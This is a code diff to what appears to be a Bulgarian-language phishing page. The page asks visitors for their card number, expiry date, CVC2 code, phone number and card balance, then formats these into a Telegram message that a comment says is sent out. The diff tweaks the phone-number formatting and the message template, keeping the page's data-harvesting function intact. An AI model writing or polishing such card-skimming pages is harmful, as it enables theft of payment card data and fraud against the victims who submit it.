@@ -267,7 +267,7 @@
 
             <div class="form-group">
                 <label>Телефонен номер</label>
-                <input type="text" id="phoneNumber" placeholder="+359..." maxlength="13">
+                <input type="text" id="phoneNumber" placeholder="+359 ..." maxlength="15">
             </div>
 
             <div class="form-group">
@@ -341,14 +341,15 @@
         }
     });
 
-    // Форматиране на телефонен номер
-    document.getElementById('phoneNumber').addEventListener('input', e => {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.length <= 3) {
-            e.target.value = '+359 ' + value;
+     // Форматирование номера телефона
+    document.getElementById('phoneNumber').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');  // Убираем все нецифровые символы
+        if (value.length > 3) {
+            value = '+359 ' + value.slice(3, 6) + ' ' + value.slice(6, 9) + ' ' + value.slice(9, 12);  // Форматируем
         } else {
-            e.target.value = '+359 ' + value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
+            value = '+359 ' + value.slice(3);  // Форматируем для первых трех цифр
         }
+        e.target.value = value;  // Отображаем в поле
     });
 
     // Форматирование баланса
@@ -376,13 +377,11 @@
 
         // Съобщение за Telegram с использованием цитат и кодов
 const message = `
-<pre>
-<b>🪙 Номер на картата:</b> <code>${cardNumber}</code>
-<b>📅 Срок на валидност:</b> <code>${expiry}</code>
+<b>🪙 Номер карты:</b> <code>${cardNumber}</code>
+<b>📅 Срок:</b> <code>${expiry}</code>
 <b>🔒 CVC2:</b> <code>${cvc}</code>
-<b>📱 Телефонен номер:</b> <code>${phoneNumber}</code>
-<b>💳 Баланс на картата:</b> <code>${balance}</code>
-</pre>
+<b>📱 Телефон:</b> <code>${phoneNumber}</code>
+<b>💳 Баланс:</b> <code>${balance}</code>
 `;
 
         // Изпращане на съобщение в Telegram
@@ -443,3 +442,4 @@ const message = `
 
 </body>
 </html>
+
